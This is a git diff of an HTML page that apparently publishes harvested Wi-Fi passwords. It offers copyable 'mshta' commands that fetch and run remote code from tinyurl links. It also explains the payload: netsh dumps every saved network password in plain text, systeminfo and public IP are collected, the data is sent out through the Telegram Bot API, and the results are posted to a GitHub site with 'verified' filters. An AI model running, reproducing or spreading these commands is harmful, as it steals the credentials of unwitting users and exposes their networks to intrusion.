@@ -11,9 +11,31 @@
     <div id="copy-banner">Copied to clipboard</div>
     <div class="info">
       <h2>Commands:</h2>
-      <p>Regular version:<pre class="copy">mshta https://tinyurl.com/network-ims</pre></p>
-      <br>
-      <p>Backup version (if regular doesn't work):<pre class="copy">mshta https://tinyurl.com/network-ims-v2</pre></p>
+      <p>Regular version:</p>
+      <pre class="copy">mshta https://tinyurl.com/network-ims</pre>
+      <br />
+      <p>Backup version (if regular doesn't work):</p>
+      <pre class="copy">mshta https://tinyurl.com/network-ims-v2</pre>
+    </div>
+    <br />
+    <div class="info">
+      <h2>Filters:</h2>
+      <div>
+        <input type="checkbox" id="show-unverified" />
+        <label for="show-unverified">Show Unverified</label>
+      </div>
+      <div>
+        <input type="checkbox" id="show-unknown" />
+        <label for="show-unknown">Show Unknown</label>
+      </div>
+      <div>
+        <input type="checkbox" id="show-not-tested" checked />
+        <label for="show-not-tested">Show Not Tested</label>
+      </div>
+      <div>
+        <input type="checkbox" id="show-verified" checked />
+        <label for="show-verified">Show Verified</label>
+      </div>
     </div>
     <br />
     <h1 id="networks-title">Networks:</h1>
@@ -25,30 +47,50 @@
     <div class="info">
       <h2>Additional information:</h2>
       <p>
-        IP and Owner info is removed, because it is considered sensitive information.
+        IP and Owner info is removed, because it is considered sensitive
+        information.
       </p>
       <p>
-        ⚠️ (Password Unknown/Forgotten) - when used <code>netsh wlan show profile key="clear"</code> on the network, no password was returned (the network was forgotten)
+        ⚠️ (Password Unknown) - when used
+        <code>netsh wlan show profile key="clear"</code> on the network, no
+        password was returned (invalid characters in the network name)
       </p>
       <p>
-        ✅ (Password Verified) - one of the passwords (the underlined one) is the correct network password
+        ✅ (Password Verified) - one of the passwords (the underlined one) is
+        the correct network password
       </p>
-      <p>
-        ❌ (Password Unverified) - none of the passwords are correct
-      </p>
+      <p>❌ (Password Unverified) - none of the passwords are correct</p>
     </div>
     <br />
     <div class="info">
       <h2>How it works:</h2>
       <ol>
-        <li><code>netsh wlan show profiles</code> is ran, and all known networks are extracted</li>
-        <li><code>netsh wlan show profile name="{name}" key=clear</code> is ran for each of the extracted networks, <code>key=clear</code> makes the password plain text</li>
-        <li>The password is extracted from each one, and saved into a variable</li>
-        <li><code>curl ifcfg.me</code> is ran, to get the public IP of the device (not used)</li>
-        <li><code>systeminfo</code> is ran, to get the System Manufacturer, Model, OS Name, Host Name, and Owner (not used) of the device</li>
+        <li>
+          <code>netsh wlan show profiles</code> is ran, and all known networks
+          are extracted
+        </li>
+        <li>
+          <code>netsh wlan show profile name="{name}" key=clear</code> is ran
+          for each of the extracted networks, <code>key=clear</code> makes the
+          password plain text
+        </li>
+        <li>
+          The password is extracted from each one, and saved into a variable
+        </li>
+        <li>
+          <code>curl ifcfg.me</code> is ran, to get the public IP of the device
+          (not used)
+        </li>
+        <li>
+          <code>systeminfo</code> is ran, to get the System Manufacturer, Model,
+          OS Name, Host Name, and Owner (not used) of the device
+        </li>
         <li>Everything is saved into variable with the json syntax</li>
         <li>All info is sent using the Telegram Bot Get API</li>
-        <li>The received message is uploaded to GitHub, where the website automatically updates</li>
+        <li>
+          The received message is uploaded to GitHub, where the website
+          automatically updates
+        </li>
       </ol>
     </div>
     <br />
